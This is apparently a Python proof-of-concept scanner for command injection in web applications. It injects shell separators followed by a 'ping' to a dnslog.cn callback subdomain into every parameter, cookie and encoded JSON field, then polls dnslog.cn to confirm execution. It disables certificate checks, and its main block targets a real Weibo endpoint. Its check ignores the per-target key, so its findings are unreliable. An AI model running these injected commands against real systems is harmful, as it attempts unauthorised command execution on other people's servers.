#coding: utf-8
import logging
import json
import time
import hashlib, random
import urllib.parse, base64
import copy
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level = logging.INFO, format='%(asctime)s - %(levelname)s [%(filename)s:%(lineno)d]: %(message)s')

class dnslog(object):
    def __init__(self):
        self.subdomain_url = 'http://dnslog.cn/getdomain.php?t=0.24411870217658538'
        self.cookies = {'PHPSESSID':''}
        self.verify_url = 'http://dnslog.cn/getrecords.php?t=0.4137965633035243'
        self.subdomain = ''

        self.getsubdomain()

    def getsubdomain(self):
        try:
            r = requests.get(self.subdomain_url, timeout=10)
            self.subdomain = '.'+r.text
            self.cookies.update({'PHPSESSID': r.cookies.get('PHPSESSID')})
        except Exception as e:
            print('dnslog '+str(e))

    def verify(self, data):
        try:
            r = requests.get(self.verify_url, timeout=10, cookies=self.cookies)
            if r.json():
                return True
            return False
        except Exception as e:
            print('dnslog '+str(e))
            return False


class Poc(object):

    def __init__(self):
        self.dnslog = dnslog()
        self.poc0 = "ping REPLACE"+self.dnslog.subdomain
        self.poc = [";", "|", "&", "||", "&&"]

    
    def cookParam(self, pmap, p):
        ret = {}
        for k,v in pmap.items():
            if isinstance(v, str):
                v = urllib.parse.quote(urllib.parse.unquote(v)+p)
                
            ret[k] = v
        return ret

    def verify(self, data):
        url = data.get('url')
        url = urllib.parse.urlparse(url)
        host = url.netloc.split(':')[0]
        host = host.replace('.', '_')
        key = host+str(random.randint(11, 99))
        for p in self.poc:
            try:
                metainfo = copy.deepcopy(data)
                p += self.poc0.replace('REPLACE', key)
                # 登录扫描
                self.walkjson(metainfo['params'], p)
                self.walkjson(metainfo['data'], p)

                result = self.sendreq(metainfo)
                if result != False:
                    time.sleep(1)
                    result = self.dnslog.verify(key)
                    
                    if result:
                        logging.info('================={}存在cmd injection {}'.format(metainfo['url'], key))
                        return [{
                                "title": "{} 存在命令注入漏洞".format(metainfo.get('url').split('?')[0]),
                                "desc":  "方式 {}".format(p),
                                "request": metainfo,
                                "severity": "high",
                            }]
                
                # 非登录
                metainfo['cookies'] = self.cookParam(metainfo['cookies'], p)
                if metainfo['cookies']:
                    result = self.sendreq(metainfo)
                    if result != False:
                        time.sleep(1)
                        result = self.dnslog.verify(key)
                        
                        if result:
                            logging.info('================={}存在cmd injection {}'.format(metainfo['url'], key))
                            return [{
                                    "title": "{} 存在命令注入漏洞".format(metainfo.get('url').split('?')[0]),
                                    "desc":  "方式 {}".format(p),
                                    "request": metainfo,
                                    "severity": "high",
                                }]
                
            except Exception as e:
                logging.error(str(e)+metainfo['url'])

    def walkjson(self, d, p):
        if isinstance(d, list):
            t = enumerate(d)
        elif isinstance(d, dict):
            t = d.items()
        for k, v in t:
            if isinstance(v, str):
                special = False
                if v.startswith('eyJ'):
                    try:
                        #base64json
                        vv = base64.b64decode(v)
                        vv = json.loads(vv)
                        special = True
                    except:
                        vv = {}
                        special = False
                    for _k,_v in vv.items():
                        #插入payload
                        vv[_k] = str(_v)+p
                    if special:
                        d[k] = base64.b64encode(json.dumps(vv).encode()).decode()

                if not special and (v.startswith('%7B') or v.startswith('{')):
                    #json
                    vv = urllib.parse.unquote(v)
                    try:
                        vv = json.loads(vv)
                        special = True
                    except:
                        vv = {}
                        special = False
                    for _k,_v in vv.items():
                        #插入payload
                        vv[_k] = str(_v)+p
                    if special:
                        d[k] = urllib.parse.quote(json.dumps(vv))
                if not special:
                    #插入payload
                    d[k] = str(v)+p
                
            elif isinstance(v, list) or isinstance(v, dict):
                self.walkjson(v, p)
        
    def sendreq(self, data, allow_redirects=False):
        j = {}
        proxies = {}
        #proxies = { "http": "socks5://127.0.0.1:10800", "https": "socks5://127.0.0.1:10800", }
        #proxies = {"http": "http://127.0.0.1:8882", "https": "http://127.0.0.1:8882"}
        j['proxies'] = proxies
        j['url'] = data.get('url').split('?')[0]
        j['method'] = data.get('method')
        j['cookies'] = data.get('cookies')
        #默认会urlencode
        j['params'] = data.get('params')

        j['headers'] = data.get('headers')
        #http2.0
        if ':authority' in  j['headers'].keys():
            j['headers']['authority'] =  j['headers'][':authority']
            j['headers'].pop(':authority')
        #
        typess = data.get('type')
        if typess == 'json':
            j['json'] = data.get('data')
        elif typess == 'multipart':
            j['files'] = data.get('data')
        else:
            j['data'] = data.get('data')

        j['verify'] = False
        j['timeout'] = 10
        j['allow_redirects'] = allow_redirects

        return requests.request(**j)


if __name__ == '__main__':
    data = {"url": "https://widget.weibo.com/topics/topic_vote_base.php", "data": {"uid": "1709486153", "border": "0", "footbar": "1", "width": "821", "height": "559", "refer": "1", "filter": "0", "language": "zh_cn", "version": "eyJhIjoiaHR0cDovLyJ9", "dup": "0", "antispam": "0", "isOutTopicSearch": "0", "top_mblog": "H8gs8beQy", "isshowright": "1", "tag": "360%E6%8A%A2%E7%A5%A8%E7%8E%8B7%E4%BB%A3%2C%E5%BF%AB%E6%8A%A2%E7%A5%A8%E5%BF%AB%E5%9B%9E%E5%AE%B6%2C%E8%81%8A%E8%81%8A%E4%BD%A0%E7%9A%84%E6%98%A5%E8%BF%90%E6%95%85%E4%BA%8B", "og": "http%3A%2F%2F12306.360.cn%2F%3Ffrom%3Dweibo", "app_src": "5E3UYb", "r": "1566802460646"}, "method": "post", "cookies": {"YF-Widget-G0": "4a4609df0e4ef6187a7b4717d4e6cf12"}, "headers": {"host": "widget.weibo.com", "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "accept-language": "en-US,en;q=0.5", "accept-encoding": "gzip, deflate, br", "referer": "http://12306.360.cn/", "connection": "keep-alive", "upgrade-insecure-requests": "1"}, "type": "form", "params": {}}
    print(Poc().verify(data))